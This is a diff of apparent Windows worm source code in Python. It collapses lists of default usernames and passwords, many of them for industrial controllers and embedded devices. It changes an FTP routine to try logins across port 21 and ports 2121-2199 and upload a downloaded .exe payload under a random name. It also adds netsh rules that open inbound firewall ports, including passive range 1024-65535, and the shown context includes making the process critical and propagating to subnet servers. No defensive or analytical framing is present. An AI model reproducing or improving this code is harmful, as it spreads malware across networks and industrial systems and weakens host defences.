@@ -13,161 +13,9 @@ import getpass
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-common_users = [
-    'test',
-    'abc123',
-    'nic2212',
-    'PlcmSpIp',
-    'accounting',
-    '123456',
-    'nmt',
-    'se',
-    'supervisor',
-    'Root',
-    'MayGion',
-    'USER',
-    'admin',
-    'manager',
-    'mysql',
-    'password',
-    'user',
-    'uploader',
-    'support',
-    'beijer',
-    'fdrusers',
-    'qwerty',
-    'john',
-    getpass.getuser(),
-    'nobody',
-    'administrator',
-    'default',
-    'instrument',
-    'device',
-    'httpadmin',
-    'none',
-    'ftpuser',
-    'pr',
-    'anonymous',
-    'post',
-    'Guest',
-    'marketing',
-    'mail',
-    'hr',
-    'User',
-    'IEIeMerge',
-    'sysdiag',
-    'webserver',
-    'localadmin',
-    'ftp',
-    'QNUDECPU',
-    'qbf77101',
-    'webmaster',
-    'apc',
-    'ADMIN',
-    'dmftp',
-    'sa',
-    'Admin',
-    'postmaster',
-    'dm',
-    'oracle',
-    '111111',
-    'adtec',
-    'a',
-    'root',
-    'user1',
-    'loader',
-    'su',
-    'MELSEC',
-    'ntpupdate',
-    'ftp_boot',
-    'pcfactory',
-    'sales',
-    'www-data',
-    'wsupgrade',
-    'avery',
+common_users = ['test','abc123','nic2212','PlcmSpIp','accounting','123456','nmt','se','supervisor','Root','MayGion','USER','admin','manager','mysql','password','user','uploader','support','beijer','fdrusers','qwerty','john',getpass.getuser(),'nobody','administrator','default','instrument','device','httpadmin','none','ftpuser','pr','anonymous','post','Guest','marketing','mail','hr','User','IEIeMerge','sysdiag','webserver','localadmin','ftp','QNUDECPU','qbf77101','webmaster','apc','ADMIN','dmftp','sa','Admin','postmaster','dm','oracle','111111','adtec','a','root','user1','loader','su','MELSEC','ntpupdate','ftp_boot','pcfactory','sales','www-data','wsupgrade','avery'
 ]
-common_pass = [
-    '',
-    'USER',
-    'admin',
-    'Janitza',
-    'eqidemo',
-    'spam',
-    'anonymous',
-    'supervisor',
-    'factorycast@schneider',
-    'user00',
-    'password',
-    '12hrs37',
-    '123456',
-    'aaaa',
-    'AAAA',
-    '123456789',
-    '1111',
-    'beijer',
-    'maygion.com',
-    'webadmin',
-    'b1uRR3',
-    'test2',
-    'webmaster',
-    'eMerge',
-    'pass1',
-    'test',
-    'test123',
-    'nobody',
-    'test1',
-    'root',
-    'news',
-    'info',
-    'ftp',
-    'ntpupdate',
-    'webpages',
-    'sresurdf',
-    'uploader',
-    'pcfactory',
-    'ZYPCOM',
-    'apc',
-    'admin12345',
-    'mysql',
-    'system',
-    'none',
-    '1111',
-    'ftp_boot',
-    'MELSEC',
-    'guest',
-    'nas',
-    'hexakisoctahedron',
-    'techsupport',
-    'localadmin',
-    'default',
-    'wsupgrade',
-    'stingray',
-    'dpstelecom',
-    'fwdownload',
-    'abc123',
-    'web',
-    'testingpw',
-    'ko2003wa',
-    'oracle',
-    'cvsadm',
-    '1234',
-    'testing',
-    'test4',
-    'wago',
-    'test3',
-    'tester',
-    '12345',
-    'avery',
-    'instrument',
-    'user',
-    'testuser',
-    'fhttpadmin',
-    'QNUDECPU',
-    '9999',
-    'rootpasswd',
-    'PlcmSpIp',
-    'poiuypoiuy',
-    'sysadm'
+common_pass = ['','USER','admin','Janitza','eqidemo','spam','anonymous','supervisor','factorycast@schneider','user00','password','12hrs37','123456','aaaa','AAAA','123456789','1111','beijer','maygion.com','webadmin','b1uRR3','test2','webmaster','eMerge','pass1','test','test123','nobody','test1','root','news','info','ftp','ntpupdate','webpages','sresurdf','uploader','pcfactory','ZYPCOM','apc','admin12345','mysql','system','none','1111','ftp_boot','MELSEC','guest','nas','hexakisoctahedron','techsupport','localadmin','default','wsupgrade','stingray','dpstelecom','fwdownload','abc123','web','testingpw','ko2003wa','oracle','cvsadm','1234','testing','test4','wago','test3','tester','12345','avery','instrument','user','testuser','fhttpadmin','QNUDECPU','9999','rootpasswd','PlcmSpIp','poiuypoiuy','sysadm'
 ]
 
 RtlSetProcessIsCritical = ctypes.windll.ntdll.RtlSetProcessIsCritical
@@ -208,19 +56,26 @@ def download_payload():
 def ftp_connect(ip, user, pwd, anonymous=False):
     global PAYLOAD_PATH
     try:
-        ftp = ftplib.FTP(ip, timeout=2)
-        if anonymous: ftp.login()
-        else: ftp.login(user, pwd)
-        random_name = f'{generate_random_name()}.exe'
-        if PAYLOAD_PATH and os.path.exists(PAYLOAD_PATH): payload_path = PAYLOAD_PATH
-        else: payload_path = download_payload()
-        if payload_path:
-            with open(payload_path, 'rb') as f:
-                response = ftp.storbinary(f'STOR {random_name}', f)
-                if response != "226 Transfer complete.": return False
-        else: return False
-        ftp.quit()
-        return True
+        ftp = ftplib.FTP(timeout=2)
+        ports = [21]
+        ports.extend(range(2121,2200))
+        for port in ports:
+            try:
+                ftp.connect(ip, port=port)
+                if anonymous: ftp.login()
+                else: ftp.login(user, pwd)
+                random_name = f'{generate_random_name()}.exe'
+                if PAYLOAD_PATH and os.path.exists(PAYLOAD_PATH): payload_path = PAYLOAD_PATH
+                else: payload_path = download_payload()
+                if payload_path:
+                    with open(payload_path, 'rb') as f:
+                        response = ftp.storbinary(f'STOR {random_name}', f)
+                        if response != "226 Transfer complete.": return False
+                else: return False
+                ftp.quit()
+                return True
+            except: continue
+        return False
     except: return False
 
 # FTP propagation to subnet servers
@@ -338,7 +193,7 @@ def setup_ftp_server(usernames, passwords):
         site_name = 'DefaltSite'
         appcmd = r'C:\Windows\System32\inetsrv\appcmd.exe'
         ports = [21]
-        for i in range(2121, 2200, 1): ports.append(i)
+        ports.extend(range(2121,2200))
         result = subprocess.run(
             ['C:\\Windows\\System32\\netstat.exe', '-a', '-n', '-p', 'TCP'],
             capture_output=True, text=True, creationflags=0x08000000
@@ -390,7 +245,12 @@ def setup_ftp_server(usernames, passwords):
 
         # Add firewall rule for selected port
         subprocess.run(
-            f'netsh advfirewall firewall add rule name="Allow_FTP_{selected_port}" dir=in action=allow protocol=TCP localport=any profile=any enable=yes', # firewall usually enables it by default, still just in case
+            f'netsh advfirewall firewall add rule name="Allow_FTP_{selected_port}" dir=in action=allow protocol=TCP localport={selected_port} profile=any enable=yes', # firewall usually enables it by default, still just in case
+            shell=True, capture_output=True, creationflags=0x08000000
+        )
+
+        subprocess.run(
+            f'netsh advfirewall firewall add rule name="Allow_FTP_Passive" dir=in action=allow protocol=TCP localport=1024-65535 profile=any enable=yes',
             shell=True, capture_output=True, creationflags=0x08000000
         )
 
